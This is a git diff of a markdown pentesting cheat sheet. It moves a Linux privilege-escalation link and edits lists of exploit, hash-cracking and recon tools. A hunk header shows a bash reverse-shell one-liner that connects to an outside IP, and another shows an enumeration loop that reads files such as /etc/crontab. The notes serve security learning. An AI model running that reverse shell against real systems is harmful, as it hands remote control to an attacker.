@@ -46,7 +46,6 @@ bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
 
 ### Linux Privilege Escalation:
 
-[other](./other/src/linux_priv_esc.md)
 #### information gathering
 
 ```bash
@@ -94,6 +93,8 @@ for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/
 
 </details>
 
+[other](./other/src/linux_priv_esc.md)
+
 ---
 
 [windows](./other/windows.md)
@@ -101,14 +102,9 @@ for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/
 ---
 
 ### links
-
-* [database with CVE exploits](https://cvexploits.io/)
+#### notes
 * [explainshell.com](https://explainshell.com/)
-* [reverse shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-* [rapid7](https://www.rapid7.com/)
-* [attackerkb](https://attackerkb.com/)
 * [cve.mitre.org](https://cve.mitre.org/cve/)
-* [exploit-db](https://www.exploit-db.com/)
 * [WTFBINS (cve)](https://wtfbins.wtf/)
 * [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/)
 * [bash cheatsheet](https://devhints.io/bash)
@@ -118,13 +114,11 @@ for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/
 * [awesome ctf](https://github.com/apsdehal/awesome-ctf)
 
 #### Encoding techniques:
-
 - [splitbrain](https://www.splitbrain.org/_static/ook/)
 - [hashes](https://hashes.com/en/tools/hash_identifier)
 - [md5hashing](https://md5hashing.net/hash)
 - [cyberchef](https://gchq.github.io/CyberChef/)
-- [free pass hash cracker](https://crackstation.net/)
-- [crack station](https://crackstation.net/)
+- [crackstation](https://crackstation.net/)
 - [md5decrypt.net](https://md5decrypt.net/en/)
 - [vigenere brute force](https://www.guballa.de/vigenere-solver)
 - [html enteties](https://www.webatic.com/html-entities-convertor)
@@ -132,13 +126,13 @@ for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/
 - [xxs-encoder](http://evuln.com/tools/xss-encoder/)
 
 #### Tools
-
 * [reconftw](https://github.com/six2dez/reconftw)
 * [google dorks](/HackNotes/other/src/dorks.md)
 * [aquatone](https://github.com/michenriksen/aquatone/releases/tag/v1.7.0)(screenshots)
 * [nuclei](https://github.com/projectdiscovery/nuclei)(scan for vulns)
 * [meg](https://github.com/tomnomnom/meg)(fetch many paths for many hosts)
 * [arjun](https://github.com/s0md3v/Arjun)(http param discovery)
+- [x8](https://github.com/Sh1Yo/x8)(like arjun)
 * [dalfox](https://github.com/hahwul/dalfox)(find xxs)
 * [cdncheck](https://github.com/projectdiscovery/cdncheck)(identifying the technology associated with dns)
 * [XXSHunter](https://xsshunter.trufflesecurity.com/app/#/)
